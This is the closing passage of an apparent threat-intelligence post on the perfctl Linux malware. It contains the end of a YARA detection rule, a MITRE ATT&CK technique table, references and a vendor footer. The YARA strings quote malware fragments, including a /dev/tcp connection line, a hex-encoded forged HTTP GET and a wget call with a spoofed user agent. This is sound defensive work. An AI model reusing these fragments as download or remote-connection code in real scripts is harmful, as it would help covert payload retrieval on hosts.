        ref_url = "https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/,https://www.trendmicro.com/en_us/research/24/j/attackers-target-exposed-docker-remote-api-servers-with-perfctl-.html"

    strings:
        $str_script_01 = "pkill -9 perfctl &>/dev/null" ascii fullword
        $str_script_02 = "/tmp/.xdiag/" ascii
        $str_script_03 = "exec 3<>/dev/tcp/${HOST}/$PORT" ascii fullword
        $str_script_04 = "/tmp/.perf.c" ascii fullword
        $str_script_05 = {6563686f202d656e202247455420247b444f437d20485454502f312e305c725c6e486f73743a20247b484f53547d5c725c6e557365722d4167656e743a206375726c2f372e37342e395c725c6e5c725c6e22203e}
        $str_script_06 = "wget -U\"curl/7.74.9\""

        $str_script_07 = "/tmp/kubeupd" ascii fullword
        $str_script_08 = "ExecStart=/tmp" ascii fullword
        $str_script_09 = "/bin/kkbush" ascii fullword
        $str_script_10 = "\"aa downloaded\"" ascii fullword

    condition:
        2 of them
}
```

#### ATT&CK Techniques used

| Tactics              | Technique                                                             | Technique ID |
| -------------------- | --------------------------------------------------------------------- | ------------ |
| Reconnaissance       | Active Scanning                                                       | T1595        |
| Initial Access       | External Remote Services                                              | T1133        |
|                      | Exploit Public-Facing Application                                     | T1190        |
| Execution            | Container Administration Command                                      | T1609        |
|                      | Deploy Container                                                      | T1610        |
|                      | Command and Scripting Interpreter: Unix Shell                         | T1059.004    |
|                      | Scheduled Task/Job: Systemd Timers                                    | T1053.006    |
|                      | Shared Modules                                                        | T1129        |
| Privilege escalation | Escape to Host                                                        | T1611        |
| Persistance          | Account Manipulation: SSH Authorized Keys                             | T1098.004    |
|                      | Create or Modify System Process: Systemd Service                      | T1543.002    |
|                      | Create or Modify System Process: Container Service                    | T1543.005    |
|                      | Scheduled Task/Job: Cron                                              | T1053.003    |
|                      | Scheduled Task/Job: Systemd Timers                                    | T1053.006    |
|                      | Event Triggered Execution: Unix Shell Configuration Modification      | T1546.004    |
| Defense Evasion      | Masquerading: Match Legitimate Name or Location                       | T1036.005    |
|                      | Hijack Execution Flow: Dynamic Linker Hijacking                       | T1574.006    |
|                      | Hijack Execution Flow: Path Interception by PATH Environment Variable | T1574.007    |
|                      | Rootkit                                                               | T1014        |
|                      | Obfuscated Files or Information: Software Packing                     | T1027.002    |
|                      | Obfuscated Files or Information: Encrypted/Encoded File               | T1027.013    |
|                      | Masquerading: Space after Filename                                    | T1036.006    |
|                      | Hide Artifacts: Hidden Files and Directories                          | T1564.001    |
|                      | Indicator Removal: Timestomp                                          | T1070.006    |
|                      | Abuse Elevation Control Mechanism: Setuid and Setgid                  | T1548.001    |
| Collection           | Input Capture: Keylogging                                             | T1056.001    |
|                      | Data from Local System                                                | T1005        |
|                      | Archive Collected Data: Archive via Utility                           | T1560.001    |
|                      | Automated Collection                                                  | T1119        |
|                      | Command and Scripting Interpreter: Unix Shell                         | T1059.004    |
|                      | Unsecured Credentials: Credentials In Files                           | T1552.001    |
|                      | Unsecured Credentials: Bash History                                   | T1552.003    |
|                      | Unsecured Credentials: Container API                                  | T1552.007    |
| Impact               | Resource Hijacking: Compute Hijacking                                 | T1496.001    |
|                      | Resource Hijacking: Bandwidth Hijacking                               | T1496.002    |

### References

1.  <https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:1 "return to article")

2.  <https://isc.sans.edu/diary/31334> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:2 "return to article")

3.  <https://www.trendmicro.com/fr_fr/research/24/j/attackers-target-exposed-docker-remote-api-servers-with-perfctl-.html> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:3 "return to article")

4.  <https://www.cadosecurity.com/blog/from-automation-to-exploitation-the-growing-misuse-of-selenium-grid-for-cryptomining-and-proxyjacking> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:4 "return to article")

5.  <https://github.com/portainer/portainer> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:5 "return to article")

6.  <https://github.com/portainer/agent/blob/develop/README.md#default-mode> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:6 "return to article")

7.  <https://github.com/upx/upx> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:7 "return to article")

8.  <https://github.com/neurobin/sh> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:8 "return to article")

9.  <https://medium.com/@0x8080/how-to-manually-unpack-a-binary-e56e18732b3b> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:9 "return to article")

10. <https://github.com/jm33-m0/emp3r0r> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:10 "return to article")

11. <https://exatrack.com/recherche_compromission.html> [↩](https://blog.exatrack.com/Perfctl-using-portainer-and-new-persistences/#fnref:11 "return to article")

## Contact us !

------------------------------------------------------------------------

For more information on any of our services, please do not hesitate to contact us; we will be happy to provide you with details of our prestations.

contact \[at\] exatrack \[dot\] com

[@ExaTrack](https://twitter.com/ExaTrack)

[ExaTrack](https://www.linkedin.com/company/exatrack/)

[CERT-Exatrack RFC2350](https://exatrack.com/CERT-Exatrack-RFC2350.pdf)

[CERT-Exatrack public key](https://exatrack.com/public.asc)

[RFC2350 signature](https://exatrack.com/public.asc)

\

[Legal notices](https://exatrack.com/mentions_legales.txt)

© 2026 [Exatrack](https://blog.exatrack.com/)